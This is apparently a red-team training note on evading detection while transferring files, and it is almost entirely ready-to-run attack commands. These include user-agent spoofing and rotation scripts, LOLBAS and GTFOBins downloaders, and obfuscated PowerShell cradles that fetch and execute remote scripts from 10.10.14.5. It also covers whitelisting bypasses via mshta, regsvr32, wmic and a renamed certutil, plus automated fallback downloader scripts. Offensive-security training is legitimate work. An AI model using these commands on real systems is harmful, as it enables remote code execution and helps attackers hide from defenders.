---
tags: [module/file-transfers, evasion, user-agent, lolbas, gtfobins, obfuscation, red-team, level/advanced, practical]
---

# Evading Detection - Practical Application

## Complete Evasion Workflow

Phase 1: User Agent Manipulation
Phase 2: LOLBAS Deep Dive
Phase 3: GTFOBins Deep Dive
Phase 4: Custom LOLBIN Discovery
Phase 5: Obfuscation Techniques
Phase 6: Application Whitelisting Bypass
Phase 7: Automation

---

## Phase 1: User Agent Manipulation

### PowerShell User Agent Options

# List all built-in user agents
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}}

# Use Chrome user agent
$ua = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest -Uri http://10.10.14.5/file.exe -UserAgent $ua -OutFile file.exe

# Use Firefox user agent
$ua = [Microsoft.PowerShell.Commands.PSUserAgent]::FireFox
Invoke-WebRequest -Uri http://10.10.14.5/file.exe -UserAgent $ua -OutFile file.exe

### Custom User Agents

# Set a completely custom user agent
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
$wc.DownloadFile("http://10.10.14.5/file.exe", "file.exe")

# Invoke-WebRequest with custom user agent
Invoke-WebRequest -Uri "http://10.10.14.5/file.exe" -OutFile "file.exe" -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

### Mimic Legitimate Windows Update

$ua = "Microsoft BITS/7.8"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", $ua)
$wc.DownloadFile("http://10.10.14.5/update.cab", "C:\Windows\Temp\update.cab")

### User Agent Rotation Script

Save as rotate-ua.ps1:

$uas = @(
    [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome,
    [Microsoft.PowerShell.Commands.PSUserAgent]::FireFox,
    [Microsoft.PowerShell.Commands.PSUserAgent]::InternetExplorer,
    [Microsoft.PowerShell.Commands.PSUserAgent]::Opera,
    [Microsoft.PowerShell.Commands.PSUserAgent]::Safari,
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
)

$url = "http://10.10.14.5/file.exe"
$output = "file.exe"

$random = Get-Random -Minimum 0 -Maximum $uas.Length
$selectedUA = $uas[$random]

Write-Host "[*] Using User-Agent: $selectedUA"
Invoke-WebRequest -Uri $url -UserAgent $selectedUA -OutFile $output

---

## Phase 2: LOLBAS Deep Dive

### Finding LOLBAS Downloaders

# Search LOLBAS for download functions
https://lolbas-project.github.io/\#/download

### GfxDownloadWrapper.exe

# Check if present
Get-ChildItem -Path C:\ -Recurse -Filter GfxDownloadWrapper.exe -ErrorAction SilentlyContinue 2>$null

# Usage
GfxDownloadWrapper.exe "http://10.10.14.5/file.exe" "C:\Temp\file.exe"

### CertOC.exe

# Windows Certificate Manager utility
CertOC.exe -Get "http://10.10.14.5/file.exe" C:\Temp\file.exe

### Makecab.exe

# Create cab file
makecab file.exe output.cab

# Expand cab file
expand output.cab file.exe

### Expand.exe

expand http://10.10.14.5/file.cab C:\Temp\file.exe

### PresentationHost.exe

# .NET framework binary
PresentationHost.exe -Download http://10.10.14.5/file.exe C:\Temp\file.exe

### IeToXps.exe

# Internet Explorer to XPS converter
IeToXps.exe -Download http://10.10.14.5/file.exe C:\Temp\file.exe

### Https.sys (Windows kernel driver)

# This one is tricky - requires custom implementation

---

## Phase 3: GTFOBins Deep Dive

### Finding GTFOBins Downloaders

https://gtfobins.github.io/\#+file%20download

### APT (Advanced Package Tool)

apt download file
# But you control the repo
echo "deb http://10.10.14.5/ ./" > /etc/apt/sources.list.d/malicious.list
apt update
apt download file

### dpkg

dpkg -i http://10.10.14.5/file.deb

### rpm

rpm -ivh http://10.10.14.5/file.rpm

### snap

snap download http://10.10.14.5/file.snap

### pip

pip install http://10.10.14.5/file.whl

### gem

gem install http://10.10.14.5/file.gem

### npm

npm install http://10.10.14.5/file.tgz

### ssh with ProxyCommand

ssh -o ProxyCommand="nc -X connect -x 10.10.14.5:8080 %h %p" user@target

---

## Phase 4: Custom LOLBIN Discovery

### Find New LOLBINs

# Search for binaries that make network connections
Get-ChildItem -Path C:\Windows\System32 -Recurse -Filter *.exe | ForEach-Object {
    if ((Get-ChildItem $_.FullName).Length -lt 5MB) {
        $output = & $_.FullName --help 2>&1
        if ($output -match "http|url|download|upload") {
            Write-Host "[+] Potential LOLBIN: $_"
        }
    }
}

### Monitor Process Network Activity

# Use Sysmon to identify new LOLBINs
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object { $_.Id -eq 3 -and $_.Message -match "DestinationIp" } | Select-Object -First 100 | Format-List

### Process Explorer Method

# Look for binaries making outbound connections
# Use Process Explorer or TCPView to identify unusual network activity

---

## Phase 5: Obfuscation Techniques

### PowerShell Obfuscation

# Base64 encode command
$command = "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -ep bypass -enc $encoded

### Variable Obfuscation

$w = New-Object Net.WebClient
$u = "http://10.10.14.5/file.exe"
$f = "file.exe"
$w.DownloadFile($u, $f)

### String Splitting

$url = "ht" + "tp" + "://" + "10.10.14.5" + "/file.exe"
(New-Object Net.WebClient).DownloadFile($url, "file.exe")

### Escape Characters

powershell -c "I`EX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"

### Comment Obfuscation

powershell -c "IEX <# comment #> (New-Object <# comment #> Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"

---

## Phase 6: Application Whitelisting Bypass

### Using Trusted Locations

# Copy binary to trusted location
copy certutil.exe C:\Windows\System32\Tasks\svchost.exe
C:\Windows\System32\Tasks\svchost.exe -urlcache -f http://10.10.14.5/file.exe file.exe

### DLL Side-Loading

# Find a vulnerable application
Find-VulnerableDLL.ps1

# Place malicious DLL in same directory
copy malicious.dll C:\Program Files\TrustedApp\dll.dll

### Using Signed Binaries

# Find signed Microsoft binaries
Get-ChildItem C:\Windows\System32\*.exe | ForEach-Object {
    if ((Get-AuthenticodeSignature $_).Status -eq "Valid") {
        $_
    }
}

### Bypass with WMI

wmic os get /format:"http://10.10.14.5/file.xsl"

### Bypass with mshta

mshta.exe javascript:"var w=new ActiveXObject('WScript.Shell'); w.Run('powershell -c IEX (New-Object Net.WebClient).DownloadString(''http://10.10.14.5/script.ps1'')'); close();"

### Bypass with regsvr32

regsvr32 /s /n /u /i:http://10.10.14.5/file.sct scrobj.dll

---

## Phase 7: Automation

### LOLBIN Downloader Script (Windows)

Save as lolbin-download.ps1:

param(
    [string]$Url,
    [string]$Output
)

$lolbins = @(
    @{
        Name = "certutil"
        Path = "certutil.exe"
        Args = "-urlcache -f $Url $Output"
    },
    @{
        Name = "bitsadmin"
        Path = "bitsadmin.exe"
        Args = "/transfer job /download /priority high $Url $Output"
    },
    @{
        Name = "GfxDownloadWrapper"
        Path = "C:\Windows\System32\GfxDownloadWrapper.exe"
        Args = "$Url $Output"
    }
)

foreach ($bin in $lolbins) {
    if (Test-Path $bin.Path) {
        Write-Host "[*] Trying $($bin.Name)..."
        $cmd = "$($bin.Path) $($bin.Args)"
        Invoke-Expression $cmd
        if (Test-Path $Output) {
            Write-Host "[+] Success with $($bin.Name)"
            return
        }
    }
}
Write-Host "[-] No LOLBIN worked"

### LOLBIN Downloader Script (Linux)

Save as gtfo-download.sh:

#!/bin/bash
URL=$1
OUTPUT=$2

# Try curl
if command -v curl &>/dev/null; then
    curl -o "$OUTPUT" "$URL" 2>/dev/null && exit 0
fi

# Try wget
if command -v wget &>/dev/null; then
    wget -O "$OUTPUT" "$URL" 2>/dev/null && exit 0
fi

# Try python
if command -v python3 &>/dev/null; then
    python3 -c "import urllib.request; urllib.request.urlretrieve('$URL', '$OUTPUT')" 2>/dev/null && exit 0
fi

# Try perl
if command -v perl &>/dev/null; then
    perl -MLWP::Simple -e "getstore('$URL', '$OUTPUT')" 2>/dev/null && exit 0
fi

# Try php
if command -v php &>/dev/null; then
    php -r "file_put_contents('$OUTPUT', file_get_contents('$URL'));" 2>/dev/null && exit 0
fi

echo "[-] No download method succeeded"

---

## Evasion Cheatsheet

| Technique | Command |
|-----------|---------|
| Chrome UA in PowerShell | Invoke-WebRequest -Uri url -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -OutFile file |
| Custom UA in PowerShell | (New-Object Net.WebClient).Headers.Add("User-Agent","Mozilla/5.0") |
| Base64 encode command | powershell -enc $encoded |
| GfxDownloadWrapper | GfxDownloadWrapper.exe "http://server/file" "C:\file" |
| CertOC | CertOC.exe -Get "http://server/file" C:\file |
| makecab | makecab file.exe output.cab; expand output.cab file.exe |
| WMI bypass | wmic os get /format:"http://server/file.xsl" |
| mshta bypass | mshta.exe javascript:"..." |
| regsvr32 bypass | regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll |

---

## Key Takeaways

- Change your user agent to look like a browser
- PowerShell has built-in browser UAs
- Custom UAs can mimic anything
- LOLBINs are trusted system binaries
- GfxDownloadWrapper.exe can download files
- LOLBAS project catalogs Windows LOLBINs
- GTFOBins project catalogs Linux LOLBINs
- Obfuscation helps evade detection
- Application whitelisting can be bypassed
- Combine multiple techniques for best results
- Always test your evasion in the target environment
- The quieter you are, the longer you'll stay undetected
- Document what works for future engagements
- Practice all methods in the lab
